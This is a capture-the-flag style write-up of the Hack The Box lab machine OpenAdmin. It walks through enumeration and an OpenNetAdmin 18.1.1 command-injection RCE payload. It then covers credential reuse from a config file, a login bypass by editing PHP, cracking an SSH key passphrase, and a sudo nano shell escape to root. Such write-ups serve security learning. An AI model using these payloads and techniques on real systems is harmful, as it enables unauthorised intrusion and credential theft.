---
layout: post
category: writeup
---

## Machine Info

- Name: OpenAdmin
- Description: OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Webapps! Let's go ahead and dirsearch:

```bash
dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.171

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.171/_24-01-27_15-35-18.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-27_15-35-18.log

Target: http://10.10.10.171/

[15:35:18] Starting: 
[15:35:18] 200 -   11KB - /index.html                                      
[15:35:20] 403 -  277B  - /icons/                                          
[15:35:22] 301 -  312B  - /music  ->  http://10.10.10.171/music/           
[15:35:22] 200 -   12KB - /music/                                          
[15:36:02] 301 -  314B  - /artwork  ->  http://10.10.10.171/artwork/        
[15:36:02] 200 -   14KB - /artwork/
```

I find this application:

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-1.png)

I check exploitdb:
```bash
HTB searchsploit opennetadmin
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                 | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                  | php/webapps/47691.sh
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Looks like there is an RCE for our version `18.1.1`

Let's run the exploit and get a shell!

```bash
HTB bash 47691.sh http://10.10.10.171/ona/
$ whoami
www-data
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
```

### Understanding the exploit

Before I continue, I wanted to quickly try to understand the exploit:

```bash
xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip=>;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping
```

So this is the payload used by the script, it calls the tooltips on the ping command, and does the injection in the IP variable, let's attempt to replicate this manually in BurpSuite:

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-2.png)

Sending this payload through burp yields an RCE, I also notice, that for formatting they added some fluff with BEGIN and END which is neat for the shell.
## Privilege Escalation

Now to privesc, at first, I look into the config files and attempt to su into another user:

```bash
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www/local/config$ ls /home
jimmy  joanna
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$
```

```bash
jimmy@openadmin:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
jimmy@openadmin:/var/www$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

So jimmy is in the internal group, lemme try to read the internal directory in `/var/www`

I see this login page on index.php and if I enter the correct username and password, I can access main.php, which has joana's ssh key.

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-3.png)

```php
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Let's start by port forwarding localhost to my machine:
```bash
HTB ssh -D 1080 jimmy@10.10.10.171
```

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-4.png)

We see a login page, now let's see how we can bypass it!

```bash
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Jan 27 21:01 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 2980 Jan 27 21:02 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Since we have rwx on the file, we can edit it to bypass the password protection all together. I updated the code:
```php
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && $_POST['password'] == 'jimmy') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
```

Now it just checks for the username and password of jimmy

I submit those creds and we have a key!

![](assets/images/2024-01-27-HTB-OpenAdmin-writeup-image-5.png)

It's encrypted, so I added it to a file and cracked the hash:

```bash
➜  HTB ssh2john key > hash
➜  HTB john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (key)     
1g 0:00:00:01 DONE (2024-01-27 16:05) 0.6993g/s 6695Kp/s 6695Kc/s 6695KC/s bloodofyouth..bloodmabite
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

SSH in as joana now:

```bash
HTB ssh -i key joanna@10.10.10.171               
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 27 21:06:27 UTC 2024

  System load:  0.0               Processes:             185
  Usage of /:   31.8% of 7.81GB   Users logged in:       1
  Memory usage: 15%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$
```

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

I run the nano command on /opt/priv and from there I can escape into a shell

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
openadmin
```

best,
gerbsec